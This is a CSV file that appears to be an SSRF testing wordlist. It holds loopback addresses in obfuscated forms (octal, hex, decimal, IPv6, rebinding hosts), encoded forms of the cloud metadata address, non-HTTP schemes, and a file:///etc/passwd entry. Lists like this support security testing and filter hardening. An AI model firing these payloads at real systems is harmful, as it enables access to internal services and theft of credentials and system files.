Payload1,Payload2
http://127.0.0.1,url
http://0.0.0.0,url
http://localhost,url
https://127.0.0.1,url
https://0.0.0.0,url
https://localhost,url
http://[::],url
http://0000::1,url
http://localtest.me,url
127.0.0.1.nip.io,url
http://127.127.127.127,url
http://127.0.1.3,url
http://127.0.0.0,url
http://0177.0.0.1,url
http://2130706433,url
http://0,url
file:///etc/passwd,file
sftp://127.0.0.1,url
tftp://127.0.0.1,url
ldap://127.0.0.1,url
http://425.510.425.510,url
http://2852039166,url
http://714700646,url
http://0xA9.0xFE.0xA9.0xFE,url
http://0xA9FEA9FE,url
http://0x41414141A9FEA9FE,url
http://0251.0376.0251.0376,url
http://0251.00376.000251.0000376,url
